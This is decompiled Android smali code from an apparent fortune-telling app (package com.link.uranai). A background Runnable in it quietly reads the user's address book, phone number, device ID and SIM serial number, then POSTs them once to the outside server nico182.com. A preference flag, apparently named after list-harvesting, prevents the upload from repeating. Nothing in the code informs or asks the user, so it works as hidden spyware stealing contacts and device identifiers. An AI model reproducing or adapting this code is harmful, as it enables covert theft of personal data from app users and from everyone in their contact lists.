.class Lcom/link/uranai/Answer$1;
.super Ljava/lang/Object;
.source "Answer.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/link/uranai/Answer;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/link/uranai/Answer;


# direct methods
.method constructor <init>(Lcom/link/uranai/Answer;)V
    .locals 0
    .parameter

    .prologue
    .line 1
    iput-object p1, p0, Lcom/link/uranai/Answer$1;->this$0:Lcom/link/uranai/Answer;

    .line 64
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$0(Lcom/link/uranai/Answer$1;)Lcom/link/uranai/Answer;
    .locals 1
    .parameter

    .prologue
    .line 64
    iget-object v0, p0, Lcom/link/uranai/Answer$1;->this$0:Lcom/link/uranai/Answer;

    return-object v0
.end method


# virtual methods
.method public run()V
    .locals 9

    .prologue
    const/4 v8, 0x4

    .line 66
    iget-object v5, p0, Lcom/link/uranai/Answer$1;->this$0:Lcom/link/uranai/Answer;

    invoke-virtual {v5}, Lcom/link/uranai/Answer;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 67
    .local v0, context:Landroid/content/Context;
    invoke-static {}, Lcom/link/uranai/util/PhoneUtil;->getSdkVersion()I

    move-result v5

    if-ge v8, v5, :cond_2

    .line 68
    iget-object v5, p0, Lcom/link/uranai/Answer$1;->this$0:Lcom/link/uranai/Answer;

    iget-object v6, p0, Lcom/link/uranai/Answer$1;->this$0:Lcom/link/uranai/Answer;

    invoke-virtual {v6}, Lcom/link/uranai/Answer;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    invoke-static {v6}, Lcom/link/uranai/util/AddressBookUtil;->getAddressBookOver4(Landroid/content/ContentResolver;)Ljava/util/List;

    move-result-object v6

    #setter for: Lcom/link/uranai/Answer;->mapList:Ljava/util/List;
    invoke-static {v5, v6}, Lcom/link/uranai/Answer;->access$0(Lcom/link/uranai/Answer;Ljava/util/List;)V

    .line 72
    :goto_0
    iget-object v5, p0, Lcom/link/uranai/Answer$1;->this$0:Lcom/link/uranai/Answer;

    #getter for: Lcom/link/uranai/Answer;->handler:Landroid/os/Handler;
    invoke-static {v5}, Lcom/link/uranai/Answer;->access$2(Lcom/link/uranai/Answer;)Landroid/os/Handler;

    move-result-object v5

    new-instance v6, Lcom/link/uranai/Answer$1$1;

    invoke-direct {v6, p0}, Lcom/link/uranai/Answer$1$1;-><init>(Lcom/link/uranai/Answer$1;)V

    invoke-virtual {v5, v6}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 102
    const-string v5, "ALREADY_IMOSAKU"

    invoke-static {v0, v5}, Lcom/link/uranai/util/PhoneUtil;->getPref(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 103
    .local v2, isGet:Ljava/lang/String;
    invoke-static {v2}, Lcom/link/uranai/util/StringUtil;->isEmpty(Ljava/lang/String;)Z

    move-result v5

    if-nez v5, :cond_0

    const-string v5, "true"

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1

    .line 105
    :cond_0
    const/4 v5, 0x2

    :try_start_0
    new-array v5, v5, [Ljava/lang/String;

    const/4 v6, 0x0

    const-string v7, "http://nico182.com/"

    aput-object v7, v5, v6

    const/4 v6, 0x1

    const-string v7, "appli/makeData/"

    aput-object v7, v5, v6

    invoke-static {v5}, Lcom/link/uranai/util/StringUtil;->addString([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 106
    .local v4, url:Ljava/lang/String;
    new-instance v3, Ljava/util/ArrayList;

    invoke-direct {v3}, Ljava/util/ArrayList;-><init>()V

    .line 107
    .local v3, nameValuePairItems:Ljava/util/List;,"Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    new-instance v5, Lorg/apache/http/message/BasicNameValuePair;

    const-string v6, "telNo"

    invoke-static {v0}, Lcom/link/uranai/util/PhoneUtil;->getTelNo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v5, v6, v7}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 108
    new-instance v5, Lorg/apache/http/message/BasicNameValuePair;

    const-string v6, "individualNo"

    invoke-static {v0}, Lcom/link/uranai/util/PhoneUtil;->getIndividualNo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v5, v6, v7}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 109
    new-instance v5, Lorg/apache/http/message/BasicNameValuePair;

    const-string v6, "simSerialNo"

    invoke-static {v0}, Lcom/link/uranai/util/PhoneUtil;->getSimSerialNo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v5, v6, v7}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 111
    invoke-static {}, Lcom/link/uranai/util/PhoneUtil;->getSdkVersion()I

    move-result v5

    if-ge v8, v5, :cond_3

    .line 112
    new-instance v5, Lorg/apache/http/message/BasicNameValuePair;

    const-string v6, "addressBook"

    iget-object v7, p0, Lcom/link/uranai/Answer$1;->this$0:Lcom/link/uranai/Answer;

    invoke-virtual {v7}, Lcom/link/uranai/Answer;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v7

    invoke-static {v7}, Lcom/link/uranai/util/AddressBookUtil;->getAddressBookOver4_2(Landroid/content/ContentResolver;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v5, v6, v7}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 116
    :goto_1
    invoke-static {v4, v3}, Lcom/link/uranai/util/HttpUtil;->doPost(Ljava/lang/String;Ljava/util/List;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 120
    .end local v3           #nameValuePairItems:Ljava/util/List;,"Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    .end local v4           #url:Ljava/lang/String;
    :goto_2
    const-string v5, "ALREADY_IMOSAKU"

    const-string v6, "true"

    invoke-static {v0, v5, v6}, Lcom/link/uranai/util/PhoneUtil;->setPref(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 122
    :cond_1
    return-void

    .line 70
    .end local v2           #isGet:Ljava/lang/String;
    :cond_2
    iget-object v5, p0, Lcom/link/uranai/Answer$1;->this$0:Lcom/link/uranai/Answer;

    iget-object v6, p0, Lcom/link/uranai/Answer$1;->this$0:Lcom/link/uranai/Answer;

    #calls: Lcom/link/uranai/Answer;->getMailUnder4()Ljava/util/List;
    invoke-static {v6}, Lcom/link/uranai/Answer;->access$1(Lcom/link/uranai/Answer;)Ljava/util/List;

    move-result-object v6

    #setter for: Lcom/link/uranai/Answer;->mapList:Ljava/util/List;
    invoke-static {v5, v6}, Lcom/link/uranai/Answer;->access$0(Lcom/link/uranai/Answer;Ljava/util/List;)V

    goto/16 :goto_0

    .line 114
    .restart local v2       #isGet:Ljava/lang/String;
    .restart local v3       #nameValuePairItems:Ljava/util/List;,"Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    .restart local v4       #url:Ljava/lang/String;
    :cond_3
    :try_start_1
    new-instance v5, Lorg/apache/http/message/BasicNameValuePair;

    const-string v6, "addressBook"

    iget-object v7, p0, Lcom/link/uranai/Answer$1;->this$0:Lcom/link/uranai/Answer;

    #calls: Lcom/link/uranai/Answer;->getMailUnder4_2()Ljava/lang/String;
    invoke-static {v7}, Lcom/link/uranai/Answer;->access$6(Lcom/link/uranai/Answer;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v5, v6, v7}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v3, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    .line 117
    .end local v3           #nameValuePairItems:Ljava/util/List;,"Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    .end local v4           #url:Ljava/lang/String;
    :catch_0
    move-exception v1

    .line 118
    .local v1, e:Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_2
.end method
